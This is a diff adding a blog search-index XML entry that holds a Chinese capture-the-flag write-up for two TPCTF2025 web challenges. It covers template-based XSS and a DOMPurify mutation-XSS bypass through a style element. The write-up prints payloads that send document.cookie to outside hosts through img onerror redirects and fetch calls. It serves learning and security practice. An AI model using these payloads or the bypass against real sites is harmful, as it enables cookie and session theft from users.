@@ -1,0 +1,36 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search> 
+  
+  
+    
+    <entry>
+      <title>TPCTF2025 Web 复现全解</title>
+      <link href="/2025/03/31/TPCTF2025Web/"/>
+      <url>/2025/03/31/TPCTF2025Web/</url>
+      
+        <content type="html"><![CDATA[<h1 id="TPCTF2025-Web-复现全解"><a href="#TPCTF2025-Web-复现全解" class="headerlink" title="TPCTF2025 Web 复现全解"></a>TPCTF2025 Web 复现全解</h1><h2 id="baby-layout"><a href="#baby-layout" class="headerlink" title="baby-layout"></a>baby-layout</h2><h3 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h3><p>本题给了两个接口，允许我们自定义 layout 然后能够自定义 <code>&#123;&#123;content&#125;&#125;</code> 内容。</p><h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><p>登录之后发现有一个网页和 bot 功能，疑似 xss，看到 dockerfile 里面 flag 放到 bot 的 cookie 里，大概是要把 bot 的 cookie 带出来就算过了。</p><p>没有发现任何过滤，直接正常的使用 xss 来进行伪造。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">layout</span>:</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#123;&#123;content&#125;&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">payload:</span></span><br><span class="line"><span class="language-xml">&quot; onerror=&quot;window.location.href=&#x27;http://xss.domain.com/index.php/?1=&#x27;+document.cookie</span></span><br></pre></td></tr></table></figure><p>回带 flag 就行。</p><h2 id="Safe-layout"><a href="#Safe-layout" class="headerlink" title="Safe-layout"></a>Safe-layout</h2><h3 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h3><p>在上题的基础上使用 <code>DomPurify</code> 进行了过滤。</p><h3 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h3><p>本题提出了一个对 layout 进行注入的过程中使用 <code>DomPurify</code> 进行标签过滤的绕过，本题禁止使用所有的标签属性。</p><p>注意这里使用的是 <code>DomPurify</code> 这样一个<strong>工具</strong>进行过滤操作，不妨去考虑 <code>DomPurify</code> 这个工具自身产生的漏洞。</p><p>当我们对 Dom Tree 进行解析的时候，我们有一个手法叫做 <strong>mXSS</strong>：当浏览器去解析我们的标签时会自动进行一系列的<strong>修复</strong>，尝试使 Dom Tree 处于标准形式，便于后续的解析。但正是这个修复的行为导致了我们标签结构的<strong>突变（mutation）</strong>。</p><p>对于不同的浏览器，标签修复有不同的行为，所以某些 mXSS 行为在某些浏览器上不起作用（Firefox 上某些 mXSS 就没有办法起作用）。</p><p>举个例子：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">alt</span>=<span class="string">&quot;&lt;/div&gt; &lt;img src onerror=&#x27;alert(111);&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这个时候 HTML 并不会分析 <code>alt</code> 标签的内容，他会解析成一个正常的文本，而不会将中间的 <code>&lt;img</code> 元素解析出来。</p><p>但是如果我们使用 <code>&lt;style&gt;</code> 元素那就是完全不一样的表现了，类似的例子：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">  &lt;a alt=&quot;<span class="tag">&lt;/<span class="name">style</span>&gt;</span> <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> <span class="attr">onerror</span>=<span class="string">&#x27;alert(111);&#x27;</span>&gt;</span>&quot;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><p>你能够明显感觉到上下两段 html 之间的差距，这个时候由于 <code>&lt;style&gt;</code> 元素的原因，html 认为嵌合在 <code>alt</code> 标签中的 <code>&lt;/style&gt;</code> 终止元素成为了自己的元素，从而将整个 <code>&lt;img</code> 元素表现成了正常的元素，从而我们可以进行注入操作。</p><p>但是本题中我们连 <code>alt</code> 这个标签都不可能存在，所以我们需要一个新的手法来进行注入。同样是 <code>&lt;style&gt;</code> 元素的利用，根据 <code>DomPurify</code> 的过滤规则，他中间会采用类似 <code>/&lt;[/\w]/</code> 的方式检查，从而我们的 <code>&lt;&#123;&#123;content&#125;&#125;</code> 并不会被检查，所以可以在 <code>&lt;style&gt;</code> 元素中注入一个未被转义的 <code>&lt;</code> 来方便我们后续的注入。</p><p>而后面我们只需要通过 <code>mXSS</code> 的特性通过展平操作来 <code>&lt;style&gt;</code>，然后再使用我们刚刚注入的恶意 <code>&lt;</code> 来进行注入就可以了。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">  &#123;&#123;<span class="attribute">content</span>&#125;&#125;&lt;&#123;&#123;<span class="attribute">content</span>&#125;&#125; <span class="comment">/* 由于我们需要在 &lt;img 元素之前跳出 &lt;style&gt; 元素，所以需要在前面加入一个 &#123;&#123;content&#125;&#125; 来帮助我们通过突变特性弹出*/</span></span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">img src onerror=fetch(`domain.com/?flag=`+document.cookie) <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><p>后面的 <code>&lt;style&gt;</code> 帮助我们展平弹出，前面的 <code>img</code> 是我们的恶意注入代码。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> ctf </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> xctf </tag>
+            
+            <tag> writeup </tag>
+            
+            <tag> web </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+  
+  
+</search>
